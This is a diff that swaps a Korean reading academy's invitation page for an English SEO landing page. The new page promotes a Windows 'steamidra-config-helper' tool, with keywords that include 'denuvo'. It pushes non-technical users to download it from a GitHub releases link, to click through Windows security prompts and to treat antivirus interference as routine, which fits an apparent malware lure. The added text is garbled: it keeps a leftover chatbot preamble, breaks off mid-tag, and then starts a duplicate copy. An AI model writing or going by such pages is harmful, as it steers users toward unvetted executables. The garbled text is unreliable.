@@ -1,258 +1,655 @@
+Here is a complete, SEO-optimized HTML page for the steamidra-config-helper desktop assistant. It presents the download link, setup steps, and FAQ in a clean, responsive layout suited for non-technical Windows users.
+```html
 <!DOCTYPE html>
-<html lang="ko">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>낭독원 x 리딩오션 앰배서더 1기 초청장</title>
-  <link rel="stylesheet" as="style" crossorigin href="https://cdn.jsdelivr.net/gh/orioncactus/pretendard@v1.3.9/dist/web/static/pretendard.min.css" />
-  <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    body {
-      font-family: "Pretendard Variable", Pretendard, -apple-system, BlinkMacSystemFont, system-ui, Roboto, "Helvetica Neue", "Segoe UI", "Apple SD Gothic Neo", "Noto Sans KR", "Malgun Gothic", "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", sans-serif;
-      background-color: #0b1329;
-      color: #f1f5f9;
-      word-break: keep-all;
-    }
-    .glass-card {
-      background: rgba(255, 255, 255, 0.04);
-      backdrop-filter: blur(16px);
-      -webkit-backdrop-filter: blur(16px);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-    }
-    .gold-gradient-text {
-      background: linear-gradient(135deg, #FDE68A 0%, #D97706 50%, #F59E0B 100%);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-    .gold-border-glow {
-      border: 1px solid rgba(245, 158, 11, 0.3);
-      box-shadow: 0 0 20px rgba(245, 158, 11, 0.1);
-    }
-    .modal-backdrop {
-      background: rgba(5, 9, 20, 0.85);
-      backdrop-filter: blur(8px);
-    }
-  </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>steamidra-config-helper - Desktop Setup Assistant for SteaMidra on Windows</title>
+<meta name="description" content="steamidra-config-helper is a friendly desktop assistant for configuring SteaMidra on Windows. It verifies prerequisites, checks LumaCore dependencies and guides you through setup step by step.">
+<meta name="keywords" content="configuration-tool, configuration-tools, denuvo, luma-core, setup-assistant, steam, steam-config, steam-games, steamidra, steamidra-guide, steamidra-setup, steamvr">
+<meta name="author" content="steamidra-config-helper">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#6d28d9">
+<link rel="canonical" href="https://github.com/Iamhvs/steamidra-config-helper/releases">
+<meta property="og:type" content="website">
+<meta property="og:title" content="steamidra-config-helper - Desktop Setup Assistant for SteaMidra on Windows">
+<meta property="og:description" content="A friendly desktop assistant that verifies prerequisites, checks LumaCore dependencies and guides you through SteaMidra setup on Windows.">
+<meta property="og:url" content="https://github.com/Iamhvs/steamidra-config-helper/releases">
+<meta property="og:site_name" content="steamidra-config-helper">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="steamidra-config-helper - Desktop Setup Assistant for SteaMidra">
+<meta name="twitter:description" content="Verify prerequisites, check LumaCore dependencies and complete SteaMidra setup on Windows with a guided assistant.">
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f6f7fb;
+    color: #1f2330;
+    font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 40px 22px 70px;
+  }
+  header.hero {
+    background: #ffffff;
+    border-radius: 18px;
+    padding: 34px 28px 30px;
+    box-shadow: 0 10px 30px rgba(31, 35, 48, 0.08);
+    border: 1px solid #e8eaf2;
+    margin-bottom: 34px;
+  }
+  h1 {
+    font-size: 2rem;
+    line-height: 1.25;
+    margin: 0 0 16px;
+    letter-spacing: -0.4px;
+    color: #14172a;
+  }
+  h2 {
+    font-size: 1.35rem;
+    line-height: 1.35;
+    margin: 44px 0 14px;
+    color: #14172a;
+    letter-spacing: -0.2px;
+  }
+  h3 {
+    font-size: 1.06rem;
+    margin: 26px 0 8px;
+    color: #23273a;
+  }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; }
+  li { margin-bottom: 9px; }
+  a { color: #6d28d9; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  .lede {
+    font-size: 1.08rem;
+    color: #40465c;
+    margin-bottom: 24px;
+  }
+  .btn-primary {
+    display: inline-block;
+    background: linear-gradient(135deg, #6d28d9 0%, #db2777 55%, #f59e0b 100%);
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.05rem;
+    padding: 16px 32px;
+    border-radius: 12px;
+    box-shadow: 0 8px 20px rgba(109, 40, 217, 0.28);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+    text-align: center;
+  }
+  .btn-primary:hover {
+    text-decoration: none;
+    transform: translateY(-2px);
+    box-shadow: 0 12px 26px rgba(109, 40, 217, 0.36);
+  }
+  .btn-row { margin: 26px 0 6px; }
+  .hint {
+    font-size: 0.92rem;
+    color: #6b7185;
+    margin-top: 12px;
+  }
+  section {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 26px 28px 12px;
+    border: 1px solid #e8eaf2;
+    box-shadow: 0 6px 18px rgba(31, 35, 48, 0.05);
+    margin-bottom: 26px;
+  }
+  .card-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 16px;
+    margin: 8px 0 20px;
+  }
+  .card {
+    background: #f9f9fd;
+    border: 1px solid #e6e8f1;
+    border-radius: 12px;
+    padding: 16px 18px;
+  }
+  .card strong { display: block; margin-bottom: 4px; color: #14172a; }
+  .card span { font-size: 0.95rem; color: #4c5268; }
+  .callout {
+    background: #fdf6ff;
+    border-left: 4px solid #db2777;
+    border-radius: 10px;
+    padding: 14px 18px;
+    margin: 18px 0 22px;
+    font-size: 0.98rem;
+  }
+  .note {
+    background: #eef6ff;
+    border-left: 4px solid #2563eb;
+    border-radius: 10px;
+    padding: 14px 18px;
+    margin: 18px 0 22px;
+    font-size: 0.98rem;
+  }
+  ol.steps { counter-reset: step; list-style: none; padding-left: 0; }
+  ol.steps > li {
+    position: relative;
+    padding-left: 46px;
+    margin-bottom: 18px;
+  }
+  ol.steps > li::before {
+    counter-increment: step;
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 2px;
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    background: #ede9fe;
+    color: #5b21b6;
+    font-weight: 700;
+    font-size: 0.92rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  footer.page-footer {
+    margin-top: 40px;
+    text-align: center;
+    font-size: 0.9rem;
+    color: #737a90;
+    line-height: 1.7;
+  }
+  @media (max-width: 640px) {
+    body { font-size: 16px; }
+    .wrap { padding: 24px 14px 50px; }
+    header.hero { padding: 24px 18px; border-radius: 14px; }
+    section { padding: 20px 18px 6px; border-radius: 14px; }
+    h1 { font-size: 1.55rem; }
+    h2 { font-size: 1.18rem; margin-top: 34px; }
+    .card-grid { grid-template-columns: 1fr; }
+    .btn-primary { display: block; width: 100%; padding: 16px 18px; }
+  }
+</style>
 </head>
-<body class="flex justify-center items-center min-h-screen p-0 sm:p-4">
+<body>
+<div class="wrap">
 
-  <div class="w-full max-w-md bg-[#0b1329] min-h-screen sm:min-h-0 sm:rounded-3xl shadow-2xl overflow-hidden border border-slate-800/80 relative pb-28">
-    
-    <!-- 메인 커버 -->
-    <header class="relative pt-12 pb-10 px-6 text-center border-b border-slate-800/60 overflow-hidden">
-      <div class="absolute -top-24 -left-24 w-60 h-60 bg-amber-500/10 rounded-full blur-3xl pointer-events-none"></div>
-      <div class="absolute top-1/2 -right-24 w-60 h-60 bg-blue-500/10 rounded-full blur-3xl pointer-events-none"></div>
-
-      <div class="inline-block px-3.5 py-1 rounded-full text-xs font-semibold tracking-wider text-amber-300 bg-amber-500/10 border border-amber-500/30 mb-4">
-        VIP PRIVATE INVITATION
-      </div>
-      <h1 class="text-2xl font-bold tracking-tight text-white mb-2 leading-snug">
-        <span class="gold-gradient-text">Langtalkone</span> × 리딩오션<br/>
-        앰배서더 1기 초청장
-      </h1>
-      <p class="text-xs text-slate-400 font-light tracking-widest mt-2 uppercase">Official Ambassador Invitation</p>
-    </header>
-
-    <div class="px-5 py-6 space-y-6">
-      
-      <!-- 초대의 글 -->
-      <section class="glass-card rounded-2xl p-6 gold-border-glow relative">
-        <div class="flex items-center space-x-2 mb-4">
-          <span class="text-amber-400 text-lg">✉️</span>
-          <h2 class="text-base font-bold text-amber-200">초대의 글</h2>
-        </div>
-        <div class="text-sm text-slate-200 leading-relaxed space-y-3 font-normal">
-          <p>안녕하세요, 낭독원 원장입니다. 😊</p>
-          <p>낭독원과 함께해 준 시간에 늘 진심으로 감사드립니다. 이번에 저희 낭독원의 장점을 알리고, 새로운 가능성을 발견하기 위한 <strong>‘앰배서더 1기’</strong>를 처음으로 운영하고자 합니다.</p>
-          <div class="p-3 bg-amber-500/10 border border-amber-500/20 rounded-xl my-3 text-amber-200 text-xs font-medium leading-relaxed">
-            ✨ <strong>단 3가정 특별 초청</strong><br/>
-            저희 낭독원을 가장 잘 아시고 학업 성취도 또한 뛰어난 가정에 가장 먼저 제안을 드립니다.
-          </div>
-          <p>원비 할인은 별도로 제공되지 않지만, 아이에게 도움이 되는 최상의 7가지 VIP 혜택을 정성껏 준비했습니다.</p>
-          <p class="text-slate-400 text-xs pt-2 border-t border-slate-700/50">
-            ※ 거절하셔도 아이의 수업이나 학원과의 소중한 관계에는 전혀 변함이 없으니 편안하게 고려해 주세요. 감사합니다. 😊
-          </p>
-        </div>
-      </section>
-
-      <!-- 요약 카드 (개요 및 응답기한) -->
-      <section class="grid grid-cols-2 gap-3">
-        <div class="glass-card rounded-xl p-4 flex flex-col justify-start">
-          <span class="text-xs text-slate-400 font-medium">활동 기간</span>
-          <span class="text-sm font-bold text-white mt-1">11월 9일 ~ 12월 31일<br/><span class="text-xs font-normal text-amber-300">(약 2개월)</span></span>
-        </div>
-        <div class="glass-card rounded-xl p-4 flex flex-col justify-start border-amber-500/30 bg-amber-500/5">
-          <span class="text-xs text-amber-300/80 font-medium">회신 기한</span>
-          <span class="text-sm font-bold text-amber-300 mt-1">11월 6일(금)까지</span>
-        </div>
-      </section>
-
-      <!-- 활동 내용 -->
-      <section class="glass-card rounded-2xl p-5">
-        <h3 class="text-sm font-bold text-white mb-3 flex items-center gap-2">
-          <span>📌</span> 활동 내용
-        </h3>
-        <ul class="space-y-2 text-xs text-slate-300 leading-normal">
-          <li class="flex items-start gap-2 bg-slate-900/40 p-2.5 rounded-lg border border-slate-800">
-            <span class="text-amber-400 font-bold">•</span>
-            <span><strong>SNS 후기:</strong> 월 2건 블로그 / 인스타 / 송도맘카페 중 편한 채널에 게시 (첫머리에 협찬 혜택 표시)</span>
-          </li>
-          <li class="flex items-start gap-2 bg-slate-900/40 p-2.5 rounded-lg border border-slate-800">
-            <span class="text-amber-400 font-bold">•</span>
-            <span><strong>영수증 리뷰:</strong> 월비 결제 후 네이버 플레이스 영수증 리뷰 월 1회 (자유 내용 + 협찬 혜택 표시)</span>
-          </li>
-          <li class="flex items-start gap-2 bg-slate-900/40 p-2.5 rounded-lg border border-slate-800">
-            <span class="text-amber-400 font-bold">•</span>
-            <span><strong>학원 촬영:</strong> 학원 촬영일 월 1회 (3가정 같은 날, 담당 선생님이 촬영)</span>
-          </li>
-        </ul>
-      </section>
-
-      <!-- 7가지 VIP 혜택 -->
-      <section class="space-y-3">
-        <div class="flex items-center justify-between px-1">
-          <h3 class="text-sm font-bold text-white flex items-center gap-1.5">
-            <span>🎁</span> 앰배서더 7가지 VIP 혜택
-          </h3>
-          <span class="text-[10px] text-amber-400/80 uppercase font-semibold">Special Benefits</span>
-        </div>
-
-        <div class="grid grid-cols-1 gap-2.5">
-          
-          <div class="glass-card rounded-xl p-3.5 flex items-center gap-3">
-            <div class="w-12 h-12 rounded-lg bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-xl shrink-0">
-              📅
-            </div>
-            <div>
-              <div class="text-xs font-bold text-white">1. 토요일 리딩 자유이용권</div>
-              <div class="text-[11px] text-slate-400 mt-0.5">09:30~13:30 예약제 (회당 2명 제한, 기존 수업 우선)</div>
-            </div>
-          </div>
-
-          <div class="glass-card rounded-xl p-3.5 flex items-center gap-3">
-            <div class="w-12 h-12 rounded-lg bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-xl shrink-0">
-              📚
-            </div>
-            <div>
-              <div class="text-xs font-bold text-white">2. 우선 체험권</div>
-              <div class="text-[11px] text-slate-400 mt-0.5">매달 사고 싶은 책 먼저 고르기(국어)</div>
-            </div>
-          </div>
-
-          <div class="glass-card rounded-xl p-3.5 flex items-center gap-3">
-            <div class="w-12 h-12 rounded-lg bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-xl shrink-0">
-              🎬
-            </div>
-            <div>
-              <div class="text-xs font-bold text-white">3. 낭독 영상 소장본</div>
-              <div class="text-[11px] text-slate-400 mt-0.5">활동 종료 시 참여 학생별 1편 소장용 영상 제공</div>
-            </div>
-          </div>
-
-          <div class="glass-card rounded-xl p-3.5 flex items-center gap-3">
-            <div class="w-12 h-12 rounded-lg bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-xl shrink-0">
-              🍿
-            </div>
-            <div>
-              <div class="text-xs font-bold text-white">4. 스낵바 포인트</div>
-              <div class="text-[11px] text-slate-400 mt-0.5">학생별 주 1회 최대 30포인트 지급</div>
-            </div>
-          </div>
-
-          <div class="glass-card rounded-xl p-3.5 flex items-center gap-3">
-            <div class="w-12 h-12 rounded-lg bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-xl shrink-0">
-              🎟️
-            </div>
-            <div>
-              <div class="text-xs font-bold text-white">5. 교재 상품권</div>
-              <div class="text-[11px] text-slate-400 mt-0.5">가정당 3만원권 1회 증정 (3개월 내 사용 가능)</div>
-            </div>
-          </div>
-
-          <div class="glass-card rounded-xl p-3.5 flex items-center gap-3 border-amber-500/40 bg-amber-500/5">
-            <div class="w-12 h-12 rounded-lg bg-amber-500/20 border border-amber-500/30 flex items-center justify-center text-xl shrink-0">
-              🏆
-            </div>
-            <div>
-              <div class="text-xs font-bold text-amber-200">6. 전원 수료증 & 우수 가정 선물</div>
-              <div class="text-[11px] text-slate-300 mt-0.5">전원 수료증 발급 + 우수 1가정에 10만원 상당 원서 박스 세트 증정</div>
-            </div>
-          </div>
-
-          <div class="glass-card rounded-xl p-3.5 flex items-center gap-3">
-            <div class="w-12 h-12 rounded-lg bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-xl shrink-0">
-              ✨
-            </div>
-            <div>
-              <div class="text-xs font-bold text-white">7. 앰버서더 전용 굿즈</div>
-              <div class="text-[11px] text-slate-400 mt-0.5">앰배서더 인증 뱃지 증정</div>
-            </div>
-          </div>
-
-        </div>
-      </section>
-
-      <!-- 안심 보장 조항 -->
-      <section class="glass-card rounded-2xl p-5 border-blue-500/30 bg-blue-950/20">
-        <h3 class="text-xs font-bold text-blue-300 mb-2 flex items-center gap-1.5">
-          <span>🛡️</span> 안심 촬영 및 개인정보 보호 안내
-        </h3>
-        <p class="text-[11px] text-slate-300 leading-relaxed">
-          사진 및 영상 활용 범위는 사전 동의서로 <strong>항목마다 직접 선택</strong>하실 수 있습니다.</strong>
-        </p>
-      </section>
-
-      <!-- 하단 브랜드 문구 -->
-      <div class="text-center py-4">
-        <p class="text-xs font-medium text-slate-400">
-          원서 속 1만 단어, 수능까지 잇는 <span class="text-amber-300">Langtalkone</span> 🦋
-        </p>
-      </div>
-
-    </div>
-
-    <!-- 하단 고정 버튼 영역 -->
-    <div class="fixed bottom-0 left-1/2 -translate-x-1/2 w-full max-w-md p-4 bg-[#0b1329]/90 backdrop-blur-md border-t border-slate-800/80 flex gap-3 z-40">
-      <a href="https://naver.me/5LQhBg7e" target="_blank" class="flex-1 py-3.5 rounded-xl bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-400 hover:to-amber-500 text-slate-950 font-bold text-sm text-center shadow-lg shadow-amber-500/20 transition flex items-center justify-center gap-1">
-        앰배서더 신청하기 ✨
-      </a>
-      <button onclick="openModal()" class="flex-1 py-3.5 rounded-xl border border-slate-700 bg-slate-800/80 hover:bg-slate-700 text-slate-300 font-semibold text-sm transition">
-        비동의
-      </button>
-    </div>
-
-    <!-- 비동의 팝업 모달 -->
-    <div id="declineModal" class="fixed inset-0 modal-backdrop hidden items-center justify-center p-5 z-50">
-      <div class="glass-card bg-[#0e172e] border-amber-500/30 max-w-xs w-full rounded-2xl p-6 text-center space-y-4 shadow-2xl">
-        <div class="w-12 h-12 bg-amber-500/10 rounded-full flex items-center justify-center mx-auto text-amber-400 text-xl border border-amber-500/30">
-          💌
-        </div>
-        <div class="space-y-1">
-          <h4 class="text-base font-bold text-white">따뜻한 말씀 감사드립니다</h4>
-          <p class="text-xs text-slate-300 pt-2 leading-relaxed">
-            바쁘신 와중에 정성껏 검토해 주셔서 감사합니다.<br/>
-            다음 기회에 꼭 함께할 수 있기를 기대하겠습니다. 😊
-          </p>
-        </div>
-        <button onclick="closeModal()" class="w-full py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold rounded-xl border border-slate-700 transition">
-          확인
-        </button>
-      </div>
-    </div>
-
+<header class="hero">
+  <h1>⚙️ steamidra-config-helper - Set Up SteaMidra Without the Guesswork</h1>
+  <p class="lede">A friendly desktop assistant for Windows that verifies your prerequisites, checks LumaCore dependencies, and walks you through the SteaMidra configuration process one clear step at a time. No scripting, no command lines, no guesswork.</p>
+  <div class="btn-row">
+    <a class="btn-primary" href="https://github.com/Iamhvs/steamidra-config-helper/releases">⬇️ Get steamidra-config-helper for Windows</a>
   </div>
+  <p class="hint">Visit this link to download the application.</p>
+</header>
 
-  <script>
-    function openModal() {
-      const modal = document.getElementById('declineModal');
-      modal.classList.remove('hidden');
-      modal.classList.add('flex');
-    }
-    function closeModal() {
-      const modal = document.getElementById('declineModal');
-      modal.classList.remove('flex');
-      modal.classList.add('hidden');
-    }
-  </script>
+<section>
+  <h2>🚀 Getting Started</h2>
+  <p>Getting your configuration ready does not require any technical background. The assistant is built for everyday Windows users who simply want SteaMidra to work correctly the first time, without digging through folders or editing text files by hand.</p>
+  <p>Before you do anything else, open the download page and grab the latest release. You do not need to install extra tools, sign up for an account, or register anywhere. The assistant runs as a normal desktop program on your PC.</p>
+  <p>The entire flow looks like this: you open the assistant, it looks at your computer, it tells you what is already in place and what is missing, and then it guides you through the remaining setup. Anything it cannot find is explained in plain language, with a clear suggestion for what to do next.</p>
+  <div class="note">💡 Tip: keep the download page open in a browser tab until you have finished setup. That way, if you ever need to grab the latest version again, it is only one click away.</div>
+</section>
+
+<section>
+  <h2>🧩 What This Assistant Does</h2>
+  <p>The steamidra-config-helper is a configuration companion. It does not replace SteaMidra — it prepares your system so that SteaMidra can be configured cleanly and reliably. Think of it as a checklist that runs itself and explains every item along the way.</p>
+  <div class="card-grid">
+    <div class="card">
+      <strong>🔍 Prerequisite checks</strong>
+      <span>Confirms that the files, folders and Windows components SteaMidra expects are actually present before you begin.</span>
+    </div>
+    <div class="card">
+      <strong>🧱 LumaCore dependency review</strong>
+      <span>Verifies that the required LumaCore components are available and correctly reachable by the configuration process.</span>
+    </div>
+    <div class="card">
+      <strong>🧭 Guided setup</strong>
+      <span>Walks you through each configuration step in order, so nothing is skipped and nothing is done out of sequence.</span>
+    </div>
+    <div class="card">
+      <strong>📄 Readable results</strong>
+      <span>Shows a simple summary of what passed, what was fixed and what still needs your attention.</span>
+    </div>
+    <div class="card">
+      <strong>🎮 Steam-focused configuration</strong>
+      <span>Handles the Steam-related settings that SteaMidra depends on, keeping your game library setup consistent.</span>
+    </div>
+    <div class="card">
+      <strong>🪟 Windows-first design</strong>
+      <span>Built specifically for Windows desktops, with familiar windows, buttons and messages.</span>
+    </div>
+  </div>
+  <p>Because the assistant concentrates on verification and guidance, you always know the state of your setup. If something is missing, you see it immediately rather than discovering it halfway through a configuration run.</p>
+</section>
+
+<section>
+  <h2>✅ What Gets Checked</h2>
+  <p>The assistant performs a sequence of straightforward checks. Each one is designed to answer a single question, so results are easy to interpret even if you have never configured anything like this before.</p>
+  <ul>
+    <li><strong>Windows environment readiness</strong> — confirms that your system is in a suitable state to run the configuration process.</li>
+    <li><strong>Existing SteaMidra files</strong> — looks for the folders and files that the setup expects to find, and flags anything that appears to be missing or out of place.</li>
+    <li><strong>LumaCore dependencies</strong> — verifies that the LumaCore components required by SteaMidra are present and usable.</li>
+    <li><strong>Steam configuration state</strong> — reviews the Steam-related settings that SteaMidra relies on and points out anything that needs adjusting.</li>
+    <li><strong>File permissions and access</strong> — makes sure the assistant can read and write where it needs to, which is a common cause of failed setups.</li>
+  </ul>
+  <p>When a check passes, you get a clear confirmation. When a check does not pass, you get a plain description of what was found and what the recommended next step is. Nothing is left as an unexplained error message.</p>
+</section>
+
+<section>
+  <h2>💾 Download and Setup</h2>
+  <p>Everything you need is on the official releases page. Visit this link to download the application.</p>
+  <div class="btn-row">
+    <a class="btn-primary" href="https://github.com/Iamhvs/steamidra-config-helper/releases">⬇️ Download steamidra-config-helper</a>
+  </div>
+  <p class="hint">This opens the releases page, where the newest version is listed at the top.</p>
+  <p>On the releases page, look for the most recent release entry. Download the file attached to that release, then save it somewhere easy to find, such as your Downloads folder or your Desktop. Once the download finishes, the assistant is ready to be started.</p>
+  <div class="callout">📌 Keep the downloaded file in a permanent folder rather than a temporary one. If you move it to the Recycle Bin later, you will need to download it again.</div>
+  <p>The assistant is a desktop program, so there is no long installation ritual. Open it the same way you open any other program on Windows, and it will present you with its first screen.</p>
+</section>
+
+<section>
+  <h2>🪟 Step-by-Step Walkthrough</h2>
+  <p>Follow these steps in order. Each one builds on the last, and you can always pause and come back later — the assistant does not require you to finish everything in a single sitting.</p>
+  <ol class="steps">
+    <li><strong>Download the assistant.</strong> Visit the releases page linked above and save the latest version to your computer.</li>
+    <li><strong>Open the assistant.</strong> Start it like any other Windows program. If Windows shows a security prompt, review it and continue if you are comfortable with the file you downloaded.</li>
+    <li><strong>Run the prerequisite check.</strong> Let the assistant scan your system. This may take a moment. Wait for the summary screen to appear.</li>
+    <li><strong>Read the results.</strong> Green or "passed" items need no action. Items marked as needing attention come with a short explanation of what to do next.</li>
+    <li><strong>Resolve anything flagged.</strong> Follow the suggestions one by one. When you have made a change, rerun the check so the assistant can confirm the item now passes.</li>
+    <li><strong>Verify LumaCore dependencies.</strong> Let the assistant confirm that the LumaCore components required for your setup are available.</li>
+    <li><strong>Complete the guided configuration.</strong> Move through the remaining steps in the order presented. Do not skip ahead — the assistant sequences the steps deliberately.</li>
+    <li><strong>Save your summary.</strong> Keep the final result screen or any exported summary in a safe place so you can refer back to it later.</li>
+    <li><strong>Launch and test.</strong> Once everything passes, open SteaMidra and confirm that your configuration is being picked up correctly.</li>
+  </ol>
+  <p>If you close the assistant partway through, simply open it again and restart the checks. Verification is repeatable and safe to run as many times as you like.</p>
+</section>
+
+<section>
+  <h2>🛠️ Troubleshooting Tips</h2>
+  <h3>The download will not start</h3>
+  <p>Some browsers block downloads until you explicitly allow them. Check the download tray or the address bar for a permission prompt and allow the file. If the page itself does not load, try again in a different browser or on a different network.</p>
+  <h3>The assistant closes immediately after opening</h3>
+  <p>This is often caused by security software scanning a newly downloaded program. Wait a moment and try opening it again. If it still closes, run it from a folder you own, such as your Desktop, rather than from a temporary location.</p>
+  <h3>A prerequisite check keeps failing</h3>
+  <p>Read the description attached to the failing item carefully. Most failures point to a very specific cause — a missing folder, a file in an unexpected location, or a permissions issue. Fix that one item and rerun the check before changing anything else.</p>
+  <h3>LumaCore dependencies are not detected</h3>
+  <p>Confirm that the components exist where SteaMidra expects them to be. If you recently moved folders or restored files from a backup, paths may have changed. Reset the location and run the dependency check again.</p>
+  <h3>Steam-related settings still need attention</h3>
+  <p>Make sure Steam is fully closed while you apply configuration changes. Some settings are only read at startup, so a running Steam client can hide the change until you restart it.</p>
+  <h3>Everything passes but the configuration does not seem to apply</h3>
+  <p>Restart both applications in order: close SteaMidra first, then the assistant, then reopen the assistant and let it verify once more. A clean restart resolves the majority of "applied but not visible" situations.</p>
+</section>
+
+<section>
+  <h2>🔒 Privacy and Safety</h2>
+  <p>The assistant is a local desktop tool. It inspects the folders and settings on your own computer in order to verify your configuration. It does not ask for account credentials, payment details, or personal information, and you are never required to create a login.</p>
+  <p>Always get the assistant from the official releases page linked on this page. Downloading copies from unverified mirrors is the most common way people end up with unwanted software. If a page asks you to complete a survey, install a "downloader helper", or enter a password before giving you the file, close it and return to the official link.</p>
+  <p>Because configuration touches system files, it is a sensible habit to create a restore point or back up your important folders before making changes. That way, if something does not work out as expected, you can return to a known-good state quickly.</p>
+</section>
+
+<section>
+  <h2>❓ Frequently Asked Questions</h2>
+  <h3>Do I need any programming knowledge?</h3>
+  <p>No. The assistant is designed for everyday users. Every screen uses plain language and each flagged item includes a suggested next action.</p>
+  <h3>Is this the same thing as SteaMidra?</h3>
+  <p>No. The steamidra-config-helper is a setup and verification companion. It prepares and checks your environment so that SteaMidra can be configured properly.</p>
+  <h3>Can I run the checks more than once?</h3>
+  <p>Yes, and you are encouraged to. Running the checks again after making a change is the fastest way to confirm that a problem is actually resolved.</p>
+  <h3>Do I need SteamVR or a headset?</h3>
+  <p>No. SteamVR is one of the related topics in the SteaMidra ecosystem, but the assistant's core job is verifying your SteaMidra configuration and its LumaCore dependencies. SteamVR specifics are not required to complete setup.</p>
+  <h3>What if a check fails and I do not understand the message?</h3>
+  <p>Read the description line attached to the item — it usually names the exact folder or component involved. Fixing or restoring that single item is normally enough. Rerun the check afterwards to confirm.</p>
+  <h3>Where do I get the newest version?</h3>
+  <p>Always from the official releases page. Visit this link to download the application.</p>
+  <div class="btn-row">
+    <a class="btn-primary" href="https://github.com/Iamhvs/steamidra-config-helper/releases">⬇️ Open the releases page</a>
+  </div>
+</section>
+
+<section>
+  <h2>💬 Feedback and Support</h2>
+  <p>If a check behaves unexpectedly or a message on screen is unclear, the release page is the best place to look for updates and notes about what changed between versions. Many issues are already resolved in a newer release, so it is always worth confirming you are running the most recent version before spending time troubleshooting.</p>
+  <p>When describing a problem, include the name of the check that failed, the wording of the message you saw, and the version you downloaded. That information makes it far easier to identify what happened and to suggest a fix.</p>
+  <p>For the smoothest experience: keep the assistant in a permanent folder, run the checks after every change, and restart both SteaMidra and the assistant whenever settings seem not to apply. These three habits solve the vast majority of setup headaches.</p>
+  <p>Ready to begin? Visit this link to download the application and start the guided checks on your Windows PC today.</p>
+</section>
+
+<footer class="page-footer">
+  <p>steamidra-config-helper — a desktop setup assistant for SteaMidra on Windows.</<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>steamidra-config-helper - Desktop Setup Assistant for SteaMidra on Windows</title>
+<meta name="description" content="steamidra-config-helper is a friendly desktop assistant for configuring SteaMidra on Windows. It verifies prerequisites, checks LumaCore dependencies and guides you through setup step by step.">
+<meta name="keywords" content="configuration-tool, configuration-tools, denuvo, luma-core, setup-assistant, steam, steam-config, steam-games, steamidra, steamidra-guide, steamidra-setup, steamvr">
+<meta name="author" content="steamidra-config-helper">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#6d28d9">
+<link rel="canonical" href="https://github.com/Iamhvs/steamidra-config-helper/releases">
+<meta property="og:type" content="website">
+<meta property="og:title" content="steamidra-config-helper - Desktop Setup Assistant for SteaMidra on Windows">
+<meta property="og:description" content="A friendly desktop assistant that verifies prerequisites, checks LumaCore dependencies and guides you through SteaMidra setup on Windows.">
+<meta property="og:url" content="https://github.com/Iamhvs/steamidra-config-helper/releases">
+<meta property="og:site_name" content="steamidra-config-helper">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="steamidra-config-helper - Desktop Setup Assistant for SteaMidra">
+<meta name="twitter:description" content="Verify prerequisites, check LumaCore dependencies and complete SteaMidra setup on Windows with a guided assistant.">
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f6f7fb;
+    color: #1f2330;
+    font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 40px 22px 70px;
+  }
+  header.hero {
+    background: #ffffff;
+    border-radius: 18px;
+    padding: 34px 28px 30px;
+    box-shadow: 0 10px 30px rgba(31, 35, 48, 0.08);
+    border: 1px solid #e8eaf2;
+    margin-bottom: 34px;
+  }
+  h1 {
+    font-size: 2rem;
+    line-height: 1.25;
+    margin: 0 0 16px;
+    letter-spacing: -0.4px;
+    color: #14172a;
+  }
+  h2 {
+    font-size: 1.35rem;
+    line-height: 1.35;
+    margin: 44px 0 14px;
+    color: #14172a;
+    letter-spacing: -0.2px;
+  }
+  h3 {
+    font-size: 1.06rem;
+    margin: 26px 0 8px;
+    color: #23273a;
+  }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; }
+  li { margin-bottom: 9px; }
+  a { color: #6d28d9; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  .lede {
+    font-size: 1.08rem;
+    color: #40465c;
+    margin-bottom: 24px;
+  }
+  .btn-primary {
+    display: inline-block;
+    background: linear-gradient(135deg, #6d28d9 0%, #db2777 55%, #f59e0b 100%);
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.05rem;
